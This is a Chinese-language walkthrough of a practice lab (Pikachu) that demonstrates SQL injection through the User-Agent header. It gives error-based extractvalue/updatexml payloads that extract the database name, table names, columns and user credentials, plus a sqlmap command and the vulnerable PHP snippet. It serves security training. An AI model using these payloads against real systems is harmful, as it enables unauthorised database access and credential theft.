# pikachu 靶场 HTTP 头 SQL 注入（sqli_header_login.php）

> 
> 原理：登录成功后后端会把 **User‑Agent 请求头**直接拼接到`INSERT`插入 SQL 语句存入日志表，没有过滤，属于**insert 报错注入**，不能用 union 联合查询，要用`updatexml/extractvalue`报错注入拿数据。

## 整体流程

1. 先随便登录（用户名随便填，比如`admin`，密码随便`123`），登录成功跳转到`sqli_header.php`页面。
2. 使用 **Burp Suite 抓包**，抓这个登录成功后的页面请求报文。
3. 修改请求头里的`User‑Agent`的值，放报错注入 payload，发送请求，页面会把数据库报错信息打印出来，拿到数据。

> 
> 注意：这是 INSERT 语句，**`#`、`--+`注释在这里基本无效**，payload 前后用单引号闭合，用`or '`收尾闭合后面引号CSDN博...。

## 步骤 1：探测注入点（单引号测试）

修改`User‑Agent`：

```
User-Agent: '
```

发送，如果页面出现 MySQL 语法报错，确认 User‑Agent 存在注入点。

## 步骤 2：爆出当前数据库名

修改 User‑Agent 为 payload：

```
User-Agent: ' or extractvalue(1,concat(0x7e,database())) or '
```

> 
> `0x7e`就是字符`~`，用来把查询结果和报错信息分隔开。
> 页面报错输出：`XPATH syntax error: '~pikachu'`，数据库名是 **pikachu**。

## 步骤 3：爆出 pikachu 库所有表名

```
User-Agent: ' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu'))) or '
```

会爆出表，其中有`users`用户表。

## 步骤 4：爆出 users 表里字段（username、password）

```
User-Agent: ' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'))) or '
```

## 步骤 5：爆出账号密码数据

```
User-Agent: ' or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from pikachu.users))) or '
```

> 
> `0x3a`是冒号`:`，用来分隔账号密码。

⚠️ extractvalue 最多返回 32 字符，如果数据长看不全，用`substr`分段读取：

```
' or extractvalue(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from pikachu.users),1,31))) or '
' or extractvalue(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from pikachu.users),32,31))) or '
```

### 备选函数 updatexml，效果一样

```
User-Agent: ' or updatexml(1,concat(0x7e,database()),1) or '
```

## 补充：也可以抓登录请求报文测试

- 页面是`sqli_header_login.php`登录页，提交登录表单，抓 POST 包，返回 302 跳转；跳转后的 GET 请求才会执行插入 UA 到数据库，**注入 payload 要放在跳转之后的那个 GET 包的 User‑Agent 头**，不是登录 POST 包！。

## sqlmap 自动化方式（可选）

把 burp 抓到完整请求保存为`req.txt`

```
sqlmap -r req.txt --level 3 --dbs
```

`--level3`才会检测 User‑Agent 头注入点。

## 源码逻辑帮助理解

```
$uagent = $_SERVER['HTTP_USER_AGENT'];
$sql = "insert into ... values ('xxx','$uagent','xxx')";
```

我们传入 payload，语句变成：

```
insert into ... values ('xxx','' or extractvalue(1,concat(0x7e,database())) or '','xxx')
```

单引号闭合原有字符串，把报错函数拼进 SQL 执行，数据库报错回显到页面。


# =============
具体实操
就是因为sql记录了user-agent ，所以这里不做处理的话完全可以作为sql 注入点